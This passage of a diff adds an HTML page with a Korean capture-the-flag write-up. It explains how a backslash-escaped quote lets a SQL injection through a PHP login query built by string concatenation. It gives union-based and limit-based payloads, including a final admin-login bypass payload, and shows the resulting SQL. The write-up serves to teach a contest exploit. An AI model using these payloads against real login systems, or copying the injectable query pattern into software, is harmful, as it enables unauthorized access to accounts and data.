+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--source syntax--php"><span class="syntax--variable syntax--other syntax--php"><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>$</span></span><span>query</span></span><span>  </span><span class="syntax--keyword syntax--operator syntax--assignment syntax--php"><span>=</span></span><span> </span><span class="syntax--string syntax--quoted syntax--double syntax--php"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--php"><span>"</span></span><span>select username from users where </span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--php"><span>"</span></span></span><span class="syntax--punctuation syntax--terminator syntax--expression syntax--php"><span>;</span></span><span>  </span><span class="syntax--comment syntax--line syntax--double-slash syntax--php"><span class="syntax--punctuation syntax--definition syntax--comment syntax--php"><span>//</span></span><span>변수에 쿼리 문자열을 저장하고</span><span></span></span></span></span></span>
+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--source syntax--php"><span class="syntax--variable syntax--other syntax--php"><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>$</span></span><span>query</span></span><span> </span><span class="syntax--keyword syntax--operator syntax--string syntax--php"><span>.=</span></span><span> </span><span class="syntax--string syntax--quoted syntax--double syntax--php"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--php"><span>"</span></span><span>username='</span><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>{</span></span><span class="syntax--variable syntax--other syntax--php"><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>$</span></span><span>username</span></span><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>}</span></span><span>' and password='</span><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>{</span></span><span class="syntax--variable syntax--other syntax--php"><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>$</span></span><span>password</span></span><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>}</span></span><span>';</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--php"><span>"</span></span></span><span class="syntax--punctuation syntax--terminator syntax--expression syntax--php"><span>;</span></span><span>  </span><span class="syntax--comment syntax--line syntax--double-slash syntax--php"><span class="syntax--punctuation syntax--definition syntax--comment syntax--php"><span>//</span></span><span> 받아온 변수와 함께 다시 이어 붙인다.</span><span></span></span></span></span></span>
+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--punctuation syntax--section syntax--embedded syntax--end syntax--php"><span class="syntax--source syntax--php"><span>?</span></span><span>&gt;</span></span></span></span>
+</pre>
+<ul>
+<li>여기서 $username이란 변수의 마지막에 역슬래시가 들어가게 된다면</li>
+</ul>
+<pre class="editor-colors lang-php"><span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--punctuation syntax--section syntax--embedded syntax--begin syntax--php"><span>&lt;?php</span></span></span></span>
+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--source syntax--php"><span class="syntax--string syntax--quoted syntax--double syntax--php"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--php"><span>"</span></span><span>username='asdf\' and password='</span><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>{</span></span><span class="syntax--variable syntax--other syntax--php"><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>$</span></span><span>password</span></span><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>}</span></span><span>';</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--php"><span>"</span></span></span></span></span></span>
+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--punctuation syntax--section syntax--embedded syntax--end syntax--php"><span class="syntax--source syntax--php"><span>?</span></span><span>&gt;</span></span></span></span>
+</pre>
+<ul>
+<li>$password 변수의 앞까지 전부 문자열이 되어버린다.</li>
+<li>$password 변수부터는 다른 쿼리문을 집어넣는게 가능하다!</li>
+</ul>
+<br>
+<ul>
+<li>SQL 구문 중에서 union구문을 쓰게 되면 두가지 쿼리를 동시에 사용하는 것이 가능<br>
+$password 에</li>
+</ul>
+<blockquote>
+<p>union select id username=”admin”;#</p>
+</blockquote>
+<p>또는</p>
+<blockquote>
+<p>or username=“admin”;#</p>
+</blockquote>
+<p>을 보내면!</p>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<p><img src="https://raw.githubusercontent.com/Circler-K/writeup/master/CTF/sunrinHD2018/image/3.PNG" alt="Alt text"></p>
+<ul>
+<li>
+<p>안뜬다.</p>
+</li>
+<li>
+<p>false sql injection 을 이용하여 테이블에 있는 모든 결과를 가져오기로 했다.</p>
+</li>
+</ul>
+<br>
+<blockquote>
+<p>or username=0 limit 0,1;#</p>
+</blockquote>
+<ul>
+<li>guest계정으로 로그인이 된다.</li>
+</ul>
+<blockquote>
+<p>or username=0 limit 1,1;#</p>
+</blockquote>
+<ul>
+<li>js콘솔에서 500 error를 띄워준다.</li>
+<li>500 error를 띄워 주는 것을 보고 테이블에는 guest계정만 있다고 판단했다.</li>
+<li>테이블에 guest계정만 있고 admin계정이 없다면 어떻게 풀어야하지;;</li>
+</ul>
+<h2>바로!!</h2>
+<br>
+<br>
+<br>
+<br>
+- mysql에서는 select 1하면 결과로 1이 나오는 특성을 이용해 풀었다.
+<h4>최종 payload</h4>
+<blockquote>
+<p>username=asdf\<br>
+password= union select “admin” from users;#</p>
+</blockquote>
+<ul>
+<li>위 입력값을 전송하게 되면 서버에서는</li>
+</ul>
+<pre class="editor-colors lang-PHP"><span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--punctuation syntax--section syntax--embedded syntax--begin syntax--php"><span>&lt;?php</span></span></span></span>
+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--source syntax--php"><span class="syntax--variable syntax--other syntax--php"><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>$</span></span><span>query</span></span><span>  </span><span class="syntax--keyword syntax--operator syntax--assignment syntax--php"><span>=</span></span><span> </span><span class="syntax--string syntax--quoted syntax--double syntax--php"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--php"><span>"</span></span><span>select username from users where </span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--php"><span>"</span></span></span><span class="syntax--punctuation syntax--terminator syntax--expression syntax--php"><span>;</span></span><span>  </span></span></span></span>
+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--source syntax--php"><span class="syntax--variable syntax--other syntax--php"><span class="syntax--punctuation syntax--definition syntax--variable syntax--php"><span>$</span></span><span>query</span></span><span> </span><span class="syntax--keyword syntax--operator syntax--string syntax--php"><span>.=</span></span><span> </span><span class="syntax--string syntax--quoted syntax--double syntax--php"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--php"><span>"</span></span><span>username='asdf\' and password='union select </span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--php"><span>"</span></span></span><span class="syntax--constant syntax--other syntax--php"><span>admin</span></span><span class="syntax--string syntax--quoted syntax--double syntax--php"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--php"><span>"</span></span><span> from users;#';</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--php"><span>"</span></span></span><span class="syntax--punctuation syntax--terminator syntax--expression syntax--php"><span>;</span></span></span></span></span>
+<span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--punctuation syntax--section syntax--embedded syntax--end syntax--php"><span class="syntax--source syntax--php"><span>?</span></span><span>&gt;</span></span></span></span>
+</pre>
+<ul>
+<li>PHP코드에서는 이렇게 들어가게 되고 sql쿼리로 날리게 되면</li>
+</ul>
+<pre class="editor-colors lang-sql"><span class="syntax--source syntax--sql"><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>select</span></span><span> username </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>from</span></span><span> users </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>where</span></span><span> username</span><span class="syntax--keyword syntax--operator syntax--comparison syntax--sql"><span>=</span></span><span class="syntax--string syntax--quoted syntax--single syntax--sql"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--sql"><span>'</span></span><span>asdf</span><span class="syntax--constant syntax--character syntax--escape syntax--sql"><span>\'</span></span><span> and password=</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--sql"><span>'</span></span></span><span> </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>union</span></span><span> </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>select</span></span><span> </span><span class="syntax--string syntax--quoted syntax--double syntax--sql"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--sql"><span>"</span></span><span>admin</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--sql"><span>"</span></span></span><span> </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>from</span></span><span> users</span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--semicolon syntax--sql"><span>;</span></span><span>#</span><span class="syntax--string syntax--quoted syntax--single syntax--sql"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--sql"><span>'</span></span><span>;</span></span></span>
+</pre>
+<ul>
+<li>이런식으로 asdf뒤에있는 single qoute가 무효화되면서 password조건의 첫 single qoute까지 문자열로 인식해버린다.</li>
+<li>뒤에다가는 union select구문을 사용하면 된다.</li>
+<li>이 문제를 푼 사람중에서는 as문을 사용한 컬럼명 조작한 풀이도 있다.</li>
+</ul>
+<pre class="editor-colors lang-sql"><span class="syntax--source syntax--sql"><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>select</span></span><span> username </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>from</span></span><span> users </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>where</span></span><span> username</span><span class="syntax--keyword syntax--operator syntax--comparison syntax--sql"><span>=</span></span><span class="syntax--string syntax--quoted syntax--single syntax--sql"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--sql"><span>'</span></span><span>asdf</span><span class="syntax--constant syntax--character syntax--escape syntax--sql"><span>\'</span></span><span> and password=</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--sql"><span>'</span></span></span><span> </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>union</span></span><span> </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>select</span></span><span> </span><span class="syntax--string syntax--quoted syntax--double syntax--sql"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--sql"><span>"</span></span><span>admin</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--sql"><span>"</span></span></span><span> </span><span class="syntax--keyword syntax--other syntax--alias syntax--sql"><span>as</span></span><span> username </span><span class="syntax--keyword syntax--other syntax--DML syntax--sql"><span>from</span></span><span> users</span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--semicolon syntax--sql"><span>;</span></span><span>#</span><span class="syntax--string syntax--quoted syntax--single syntax--sql"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--sql"><span>'</span></span><span>;</span></span></span>
+</pre>
+<ul>
+<li>굳이 써야하나?</li>
+</ul>
+  </body>
+</html>
